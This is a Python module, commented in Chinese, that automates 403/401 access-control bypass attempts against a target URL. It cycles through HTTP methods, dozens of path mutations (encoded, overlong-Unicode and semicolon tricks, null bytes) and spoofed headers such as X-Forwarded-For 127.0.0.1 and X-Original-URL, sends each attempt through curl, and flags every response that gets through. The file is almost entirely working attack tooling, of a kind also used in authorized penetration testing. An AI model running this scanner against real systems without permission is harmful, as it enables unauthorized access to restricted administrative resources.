#!/usr/bin/env python3
"""
Bypass 403 — 403/401 绕过专项模块

20+ 种绕过方法，自动化测试所有已知 403 bypass 技术：
1. HTTP 方法变换（GET→POST→PUT→PATCH→OPTIONS）
2. 路径变异（/admin → /Admin → /ADMIN → //admin → /./admin）
3. 特殊 Header 注入（X-Forwarded-For/X-Original-URL/X-Rewrite-URL）
4. URL 编码变体（%2f → %252f → %ef%bc%8f）
5. 路径穿越（/admin/../admin → /;/admin）
6. HTTP 版本降级（HTTP/1.0）
7. Host Header 篡改
8. Content-Length: 0 技巧
9. Unicode 路径规范化绕过
10. 协议相对路径

用法：
    from bypass_403 import Bypass403

    bypasser = Bypass403()
    results = await bypasser.scan("https://target.com/admin")
    for r in results:
        if r["bypassed"]:
            print(f"  [!] BYPASS: {r['technique']} → {r['status']}")
"""

import asyncio
import json
from typing import List, Dict, Optional
from urllib.parse import urlparse, quote
from dataclasses import dataclass, field
from datetime import datetime


# ═══════════════════════════════════════════════════════════════
# 绕过技术定义
# ═══════════════════════════════════════════════════════════════

def generate_path_mutations(path: str) -> List[Dict]:
    """生成路径变异列表"""
    # 确保 path 以 / 开头
    if not path.startswith("/"):
        path = "/" + path

    mutations = []

    # 1. 大小写变体
    mutations.append({"path": path.upper(), "technique": "path_uppercase"})
    mutations.append({"path": path.capitalize(), "technique": "path_capitalize"})

    # 2. 双斜杠
    mutations.append({"path": "/" + path, "technique": "double_slash_prefix"})
    mutations.append({"path": path + "/", "technique": "trailing_slash"})
    mutations.append({"path": path + "//", "technique": "double_trailing_slash"})
    mutations.append({"path": path.replace("/", "//"), "technique": "all_double_slash"})

    # 3. 路径穿越
    mutations.append({"path": path + "/.", "technique": "dot_suffix"})
    mutations.append({"path": path + "/./", "technique": "dot_slash_suffix"})
    mutations.append({"path": path + "/..", "technique": "dotdot_suffix"})
    mutations.append({"path": "/." + path, "technique": "dot_prefix"})
    parts = path.split("/")
    if len(parts) > 1:
        mutations.append({"path": "/" + parts[-1] + "/../" + path.lstrip("/"), "technique": "path_traversal"})

    # 4. 分号/参数注入（Tomcat/Spring 特性）
    mutations.append({"path": path + ";", "technique": "semicolon_suffix"})
    mutations.append({"path": path + ";.css", "technique": "semicolon_css"})
    mutations.append({"path": path + ";.js", "technique": "semicolon_js"})
    mutations.append({"path": path + ";.html", "technique": "semicolon_html"})
    mutations.append({"path": "/;" + path, "technique": "semicolon_prefix"})
    mutations.append({"path": path + "..;/", "technique": "dotdot_semicolon"})

    # 5. URL 编码变体
    encoded_slash = path.replace("/", "%2f")
    mutations.append({"path": encoded_slash, "technique": "url_encode_slash"})
    double_encoded = path.replace("/", "%252f")
    mutations.append({"path": double_encoded, "technique": "double_encode_slash"})

    # 6. Unicode 变体
    mutations.append({"path": path.replace("/", "%ef%bc%8f"), "technique": "unicode_fullwidth_slash"})
    mutations.append({"path": path.replace("/", "%c0%af"), "technique": "unicode_overlong_slash"})
    mutations.append({"path": path.replace("/", "%e0%80%af"), "technique": "unicode_overlong2_slash"})

    # 7. 空字节
    mutations.append({"path": path + "%00", "technique": "null_byte_suffix"})
    mutations.append({"path": path + "%0a", "technique": "newline_suffix"})
    mutations.append({"path": path + "%0d%0a", "technique": "crlf_suffix"})

    # 8. 通配符/扩展名
    mutations.append({"path": path + ".json", "technique": "json_extension"})
    mutations.append({"path": path + ".html", "technique": "html_extension"})
    mutations.append({"path": path + "?", "technique": "question_mark"})
    mutations.append({"path": path + "??", "technique": "double_question"})
    mutations.append({"path": path + "?anything", "technique": "query_param"})
    mutations.append({"path": path + "#", "technique": "fragment"})

    # 9. Tab / 空格
    mutations.append({"path": path + "%09", "technique": "tab_suffix"})
    mutations.append({"path": path + "%20", "technique": "space_suffix"})

    # 10. HTTP 版本降级用原始路径
    mutations.append({"path": path, "technique": "http10_downgrade", "http_version": "1.0"})

    return mutations


# 绕过 Header 集合
BYPASS_HEADERS_SETS = [
    # IP 伪装
    {"X-Forwarded-For": "127.0.0.1", "_technique": "xff_localhost"},
    {"X-Forwarded-For": "10.0.0.1", "_technique": "xff_internal"},
    {"X-Forwarded-For": "0.0.0.0", "_technique": "xff_zero"},
    {"X-Originating-IP": "127.0.0.1", "_technique": "originating_ip"},
    {"X-Remote-IP": "127.0.0.1", "_technique": "remote_ip"},
    {"X-Remote-Addr": "127.0.0.1", "_technique": "remote_addr"},
    {"X-Real-IP": "127.0.0.1", "_technique": "real_ip"},
    {"X-Client-IP": "127.0.0.1", "_technique": "client_ip"},
    {"X-Host": "127.0.0.1", "_technique": "x_host"},
    {"X-Forwarded-Host": "127.0.0.1", "_technique": "forwarded_host"},
    {"X-ProxyUser-Ip": "127.0.0.1", "_technique": "proxyuser_ip"},
    # URL 覆盖
    {"X-Original-URL": "/admin", "_technique": "x_original_url"},
    {"X-Rewrite-URL": "/admin", "_technique": "x_rewrite_url"},
    {"X-Override-URL": "/admin", "_technique": "x_override_url"},
    # 自定义授权
    {"X-Custom-IP-Authorization": "127.0.0.1", "_technique": "custom_ip_auth"},
    {"X-Forwarded-Server": "127.0.0.1", "_technique": "forwarded_server"},
    {"X-Forwarded-Port": "443", "_technique": "forwarded_port_443"},
    {"X-Forwarded-Port": "4443", "_technique": "forwarded_port_4443"},
    {"X-Forwarded-Port": "80", "_technique": "forwarded_port_80"},
    # Content 技巧
    {"Content-Length": "0", "_technique": "content_length_zero"},
    {"Content-Type": "application/json", "_technique": "content_type_json"},
    {"Content-Type": "application/xml", "_technique": "content_type_xml"},
    # Referer
    {"Referer": "https://target.com/admin", "_technique": "referer_admin"},
]

# HTTP 方法列表
HTTP_METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD",
                "TRACE", "CONNECT", "PROPFIND", "MOVE", "COPY"]


# ═══════════════════════════════════════════════════════════════
# 403 绕过扫描器
# ═══════════════════════════════════════════════════════════════

class Bypass403:
    """403/401 绕过自动化测试"""

    def __init__(self, config: dict = None):
        self.config = config or {}
        self.timeout = self.config.get("timeout", 10)
        self.concurrent = self.config.get("concurrent", 5)
        self.results: List[Dict] = []

    async def scan(self, url: str, cookies: str = "",
                   original_status: int = 403) -> List[Dict]:
        """
        对一个返回 403 的 URL 进行全面绕过测试

        Args:
            url: 返回 403 的 URL
            cookies: Cookie 字符串（如果有）
            original_status: 原始状态码（默认 403）

        Returns:
            绕过结果列表
        """
        self.results = []
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        path = parsed.path or "/"

        print(f"[*] 403 Bypass: {url}")
        print(f"    Testing {len(HTTP_METHODS)} methods + "
              f"{len(generate_path_mutations(path))} path mutations + "
              f"{len(BYPASS_HEADERS_SETS)} header bypasses...")

        semaphore = asyncio.Semaphore(self.concurrent)

        tasks = []

        # Phase 1: HTTP 方法变换
        for method in HTTP_METHODS:
            if method == "GET":
                continue
            tasks.append(self._test_method(url, method, cookies, semaphore))

        # Phase 2: 路径变异
        mutations = generate_path_mutations(path)
        for mut in mutations:
            test_url = base + mut["path"]
            http_ver = mut.get("http_version")
            tasks.append(self._test_path(test_url, mut["technique"], cookies, semaphore, http_ver))

        # Phase 3: Header 绕过
        for header_set in BYPASS_HEADERS_SETS:
            technique = header_set.pop("_technique", "unknown_header")
            # 对 X-Original-URL/X-Rewrite-URL 用实际路径
            headers = {}
            for k, v in header_set.items():
                if k in ("X-Original-URL", "X-Rewrite-URL", "X-Override-URL"):
                    headers[k] = path
                else:
                    headers[k] = v
            header_set["_technique"] = technique  # 恢复
            tasks.append(self._test_header(url, headers, technique, cookies, semaphore))

        # Phase 4: 方法 + Header 组合
        for method in ["POST", "PUT"]:
            for header_set in BYPASS_HEADERS_SETS[:5]:  # 只测前 5 个
                technique = header_set.get("_technique", "")
                headers = {k: v for k, v in header_set.items() if not k.startswith("_")}
                if "X-Original-URL" in headers:
                    headers["X-Original-URL"] = path
                tasks.append(self._test_combined(url, method, headers,
                                                f"{method}+{technique}", cookies, semaphore))

        await asyncio.gather(*tasks, return_exceptions=True)

        # 过滤出真正绕过的结果
        bypassed = [r for r in self.results if r.get("bypassed")]
        print(f"\n[+] 403 Bypass 完成: {len(bypassed)}/{len(self.results)} 种方法成功绕过")

        # 按状态码排序
        self.results.sort(key=lambda r: (not r.get("bypassed"), r.get("status", 999)))
        return self.results

    async def _test_method(self, url: str, method: str, cookies: str,
                           semaphore: asyncio.Semaphore):
        """测试 HTTP 方法"""
        async with semaphore:
            result = await self._send_request(url, method=method, cookies=cookies)
            result["technique"] = f"method_{method}"
            result["category"] = "method"
            self._check_bypass(result)
            self.results.append(result)

    async def _test_path(self, url: str, technique: str, cookies: str,
                         semaphore: asyncio.Semaphore, http_version: str = None):
        """测试路径变异"""
        async with semaphore:
            extra_args = []
            if http_version == "1.0":
                extra_args = ["--http1.0"]
            result = await self._send_request(url, cookies=cookies, extra_args=extra_args)
            result["technique"] = technique
            result["category"] = "path"
            self._check_bypass(result)
            self.results.append(result)

    async def _test_header(self, url: str, headers: Dict, technique: str,
                           cookies: str, semaphore: asyncio.Semaphore):
        """测试 Header 绕过"""
        async with semaphore:
            result = await self._send_request(url, headers=headers, cookies=cookies)
            result["technique"] = technique
            result["category"] = "header"
            self._check_bypass(result)
            self.results.append(result)

    async def _test_combined(self, url: str, method: str, headers: Dict,
                             technique: str, cookies: str, semaphore: asyncio.Semaphore):
        """测试组合绕过"""
        async with semaphore:
            result = await self._send_request(url, method=method, headers=headers, cookies=cookies)
            result["technique"] = technique
            result["category"] = "combined"
            self._check_bypass(result)
            self.results.append(result)

    async def _send_request(self, url: str, method: str = "GET",
                            headers: Dict = None, cookies: str = "",
                            extra_args: List = None) -> Dict:
        """发送请求"""
        cmd = ["curl", "-sk", "-m", str(self.timeout), "-X", method]
        cmd.extend(["-o", "-", "-w", "\n%{http_code}\n%{size_download}"])

        # UA
        cmd.extend(["-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                    "AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36"])

        # 自定义 Headers
        if headers:
            for k, v in headers.items():
                cmd.extend(["-H", f"{k}: {v}"])

        # Cookies
        if cookies:
            cmd.extend(["-H", f"Cookie: {cookies}"])

        # 额外参数
        if extra_args:
            cmd.extend(extra_args)

        cmd.append(url)

        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=self.timeout + 3)
            output = stdout.decode(errors="ignore")

            parts = output.rsplit("\n", 2)
            body = parts[0] if len(parts) >= 3 else ""
            status = int(parts[-2].strip()) if len(parts) >= 3 and parts[-2].strip().isdigit() else 0
            size = int(parts[-1].strip()) if len(parts) >= 3 and parts[-1].strip().isdigit() else 0

            return {
                "url": url,
                "method": method,
                "status": status,
                "size": size,
                "body_preview": body[:200],
                "bypassed": False,
            }
        except Exception:
            return {"url": url, "method": method, "status": 0, "size": 0,
                    "body_preview": "", "bypassed": False}

    def _check_bypass(self, result: Dict):
        """判断是否绕过成功"""
        status = result.get("status", 0)
        size = result.get("size", 0)

        # 200/301/302 且有内容 → 绕过
        if status in (200, 301, 302, 307) and size > 0:
            result["bypassed"] = True
            return

        # 200 但内容为空 → 可能是误报
        if status == 200 and size < 50:
            result["bypassed"] = False
            return

    def generate_report(self) -> str:
        """生成绕过报告"""
        bypassed = [r for r in self.results if r.get("bypassed")]
        if not bypassed:
            return "No 403 bypass found."

        lines = [
            "=" * 60,
            "  403 BYPASS REPORT",
            "=" * 60,
            f"  Successful bypasses: {len(bypassed)}\n",
        ]
        for r in bypassed:
            lines.append(f"  [{r['status']}] {r['technique']}")
            lines.append(f"    Method: {r['method']} | Size: {r['size']} bytes")
            lines.append(f"    URL: {r['url'][:80]}")
            lines.append("")

        return "\n".join(lines)
